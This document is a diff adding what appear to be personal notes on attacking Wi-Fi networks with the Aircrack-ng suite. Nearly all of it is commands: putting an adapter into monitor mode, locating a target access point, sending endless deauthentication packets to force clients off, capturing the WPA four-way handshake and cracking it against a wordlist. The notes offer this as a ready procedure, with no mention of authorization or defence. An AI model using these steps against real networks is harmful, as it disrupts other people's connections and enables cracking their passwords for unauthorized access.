@@ -1,0 +1,56 @@
+* This uses the Aircrack-ng suite
+	- airmon-ng
+	- airodump-ng
+
+
+============= NETWORK ADAPTER SETUP ===============
+# check for any interfering processes
+sudo airmon-ng check kill
+
+# check what mode the network adapter is in (default is Managed)
+iwconfig
+
+# put the network adapter into Monitor mode
+sudo airmon-ng start <interface>
+
+# set frequency to 5GHz
+sudo iw wlan0 set freq 5745 80 5775
+
+# discover 5GHz wifi networks (may need to reconnect the network adapter)
+sudo airodump-ng <interface> --band a
+
+# note the channel (CH) and mac address (BSSID) of the target
+CH - 44
+BSSID - 88:DE:7C:FE:20:BF
+
+# find devices that connect to a specific network (will appear under "Station")
+sudo airodump-ng <interface> --bssid <BSSID>
+
+
+============== OPEN IN TWO TERMINALS ==============
+* capture four-way hand shake using channel and mac address of a wifi network by sending a bunch of deauth packets endlessly
+
+# start the listener
+sudo airodump-ng <interface> -w <output_file> -b <band> --bssid <BSSID>
+
+# send deauth packets (broadcast or targeted)
+sudo aireplay-ng <interface> --deauth 0 -a <BSSID> -c <target_MAC>
+a: access point
+c: client
+--deauth 0: endlessly send deauth 
+
+* if receive error: "<interface> is on channel x but the AP is on channel y..."
+sudo airmon-ng start wlan0 <specific_channel>
+or 
+append -D to aireplay-ng 
+
+* when client tries to reconnect, you will capture the handshake 
+
+
+============== RETRIEVE THE HANDSHAKE =============
+* open wireshark, search EAPOL (extensible authentication protocol over LAN). You will see 4 results.
+
+* 4 way handshake: https://medium.com/wifi-testing/four-way-handshake-32356fbec1b5
+
+# time to crack
+sudo aircrack-ng <xxx.cap> -w <wordlist>
